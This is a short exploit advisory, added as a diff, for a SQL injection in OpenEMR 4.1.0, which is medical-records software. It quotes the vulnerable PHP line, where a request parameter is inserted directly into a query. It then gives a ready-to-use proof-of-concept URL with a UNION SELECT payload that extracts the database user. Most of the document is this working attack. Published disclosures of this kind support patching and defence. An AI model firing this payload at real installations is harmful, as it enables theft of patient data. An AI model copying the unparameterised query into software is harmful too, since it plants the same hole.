@@ -1,0 +1,18 @@
+# Exploit Title: [Openemr-4.1.0 SQL injection Vulnerability]
+# Date: [2011/10/18]
+# Author: [I2sec-dae jin Oh]
+# Software Link: [http://sourceforge.net/projects/openemr/files/OpenEMR%20Current/4.1.0/openemr-4.1.0.zip/download]
+# Vendor : www.open-emr.com
+# Version: [Openemr-4.1.0]
+# Tested on: [Windows 7]
+---------------------------------------
+source of : /interface/patient_file/summary/add_edit_issue.php:
+
+$irow = array();
+if ($issue)
+$irow = sqlQuery("SELECT * FROM lists WHERE id = $issue");; <--------------------- SQL injection
+else if ($thistype)
+$irow['type'] = $thistype
+proof of concept:
+http://[attack url]/interface/patient_file/summary/add_edit_issue.php?issue=0+union
++select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,user(),25,26,27--
